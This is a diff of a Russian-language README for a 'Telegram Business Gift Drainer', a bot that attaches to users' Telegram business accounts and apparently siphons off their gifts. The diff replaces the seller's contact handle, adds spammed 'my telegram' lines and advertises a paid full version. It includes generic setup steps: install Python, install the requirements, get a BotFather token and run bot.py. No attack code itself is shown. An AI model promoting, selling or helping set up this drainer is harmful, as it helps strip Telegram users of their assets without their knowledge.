@@ -1,13 +1,14 @@
 # Telegram Business Gift Drainer
 
-Купить полную версию можно  у меня. my telegram @Clof1k
-Купить полную версию можно  у меня. my telegram @Clof1k
+Купить полную версию можно  у меня. my telegram @apg_coder
+Купить полную версию можно  у меня. my telegram @apg_coder
 
 Этот проект — бизнес-бот для Telegram, который может подключаться к бизнес-аккаунтам пользователей и автоматически обрабатывать их подарки.
 
 ---
 
 ## 📦 Установка и запуск
+my telegram @apg_coder
 
 ### 1. Скачайте Python 3.10
 
@@ -17,7 +18,7 @@
 ---
 
 ### 2. Перейдите в папку с дрейнером
-
+my telegram @apg_coder
 Откройте терминал или командную строку и перейдите в папку с проектом:
 
 ```bash
@@ -32,6 +33,7 @@ pip install -r requirements.txt
 ```
 
 ### 4. Создайте бота в @BotFather
+my telegram @apg_coder
 Перейдите в Telegram и откройте бота @BotFather
 Создайте нового бота командой /newbot
 Скопируйте токен, который он выдаст
@@ -57,26 +59,5 @@ python bot.py
 ### ✅ Готово!
 Купить полную версию можно  у меня. my telegram @Clof1ks
 
-
-my telegram @Clof1k             my telegram @Clof1ks
-
-                      my telegram @Clof1k my telegram @Clof1k         my telegram @Clof1k
-
-               
-my telegram @Clof1k           my telegram @Clof1k
-
-                      my telegram @Clof1ks
-my telegram @Clof1k             my telegram @Clof1k
-
-                      my telegram @Clof1k                      my telegram @Clof1k             my telegram @Clof1k
-
-                      my telegram @Clof1k
-                                                    my telegram @Clof1k             my telegram @Clof1k
-
-                      my telegram @Clof1k
-
-s
-       my telegram @Clof1k                                  my telegram @Clof1k            my telegram @Clof1k
-
-                      my telegram @Clof1k
-
+my telegram @apg_coder my telegram @apg_codermy telegram @apg_coder my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder
+my telegram @apg_coder my telegram @apg_coder  my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder my telegram @apg_coder
